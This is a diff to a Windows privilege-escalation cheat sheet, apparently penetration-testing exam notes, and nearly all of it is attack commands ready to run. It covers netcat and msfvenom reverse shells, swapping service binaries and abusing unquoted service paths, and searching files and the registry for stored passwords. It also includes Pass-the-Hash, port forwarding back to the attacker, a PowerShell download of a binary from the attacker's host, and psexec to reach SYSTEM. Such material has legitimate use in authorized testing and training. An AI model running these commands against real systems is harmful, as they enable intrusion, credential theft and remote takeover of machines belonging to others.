@@ -1,11 +1,12 @@
 *Windows elevation of privileges*narrative
-Windows elevation of privileges
+Shell
     Getting a shell
     *$ system(“start cmd.exe /k $cmd”)*
 
     Getting a reverse shell
     *$ nc -Lp 31337 -vv -e cmd.exe*
 
+System info
     Find installed patches, architecture, OS version
     *$ systeminfo*
 
@@ -37,18 +38,79 @@ netsh firewall show config*
     List windows services
     *$ net start*
     *$ wmic service list brief*
-    Get permissions of all services. Services with full access from *BUILTIN\Users* can replace executable with malicious binary.
+    *$ tasklist /SVC*
+
+EoP 1: Incorrect permissions in services
+    Get permissions of all services. Services with full access from *BUILTIN\Users(F)* or user/usergroup has (F) or (C) are vulnable to having the binary replaced with malicious binary.
+    Find affected services:
     *$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"*
+    Transfer your binary (reverse shell/add your user to admin group).
+    then move new old, and restart the service with:
+    *$ wmic service NAMEOFSERVICE call startservice
+net stop [service name] && net start [service name]*
 
-    Find unqouted paths
+Find unquoted paths
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
 
+    For example, the following path would be vulnerable:
+    *c:\Program Files\something\winamp.exe*
+    We can place a binary like this
+    *c:\program.exe*
+
+
+
+ClearText passwords
+    Search for them
+    *$findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini*
     Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
     *$ pth-winexe -U hash //$ip cmd*
 
-    Dump passwords
-    *$ fgdump.exe*
+    Find all those strings in config files.
+    *$dir /s *pass* == *cred* == *vnc* == *.config**
+
+    Find all passwords in all files.
+    *$findstr /spin "password" *.*
+findstr /spin "password" *.*
+In Files*
+
+    These are common files to find them in. They might be base64-encoded. So look out for that.
+    *$c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml*
+
+    *$ dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini*
+
+    Stuff in the registry:
+    *$ reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"*
+
+    Search for password in registry
+    *$ reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s*
+
+
+
+Services only available from loopback
+    look for LISTENING/LISTEN
+    *netstat -ano*
+
+    Port forward using plink
+    *$ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080*
+
+    Port forward using meterpreter
+    *$ portfwd add -l <attacker port> -p <victim port> -r <victim ip>
+portfwd add -l 3306 -p 3306 -r 192.168.1.101*
+
+
 
     If powershell is blocked, you can download:
     *https://github.com/Ben0xA/nps*
@@ -120,6 +182,28 @@ Update & exploits
 7132    Service Code Exec     MS08-067    SP4        -        SP2       -            -        -
 14674   SRV2.SYS SMB          MS09-050    -         -         -         -            SP1/2    -*
 
+Windows version map
+    *Operating System 	Version Number
+
+Windows 1.0                    1.04
+Windows 2.0                    2.11
+Windows 3.0                    3
+Windows NT 3.1                 3.10.528
+Windows for Workgroups 3.11    3.11
+Windows NT Workstation 3.5 	3.5.807
+Windows NT Workstation 3.51    3.51.1057
+Windows 95                     4.0.950
+Windows NT Workstation 4.0     4.0.1381
+Windows 98                     4.1.1998
+Windows 98 Second Edition      4.1.2222
+Windows Me                     4.90.3000
+Windows 2000 Professional      5.0.2195
+Windows XP                     5.1.2600
+Windows Vista                  6.0.6000
+Windows 7                      6.1.7600
+Windows 8.1                    6.3.9600
+Windows 10                     10.0.10240*
+
 Useful commands
     Enable RDP access
     *reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
@@ -147,6 +231,9 @@ nc.exe 10.11.0.123 1234 -e cmd.exe*
     With RDP:
     *$ rdesktop (ip) -r disk:share=/home/bayo/store*
 
+    With powershell:
+    *$ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"*
+
 Metasploit
     *msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.123 -o meterpreter.php
@@ -167,6 +254,16 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 or
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 msf > run*
+
+
+From admin to system
+    *psexec.exe -i -s %SystemRoot%\system32\cmd.exe*
+
+Other commands
+    Print files contents:
+    *$ type file*
+    Remove file
+    *$ del /f file*
 
 Get proof
     *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"*
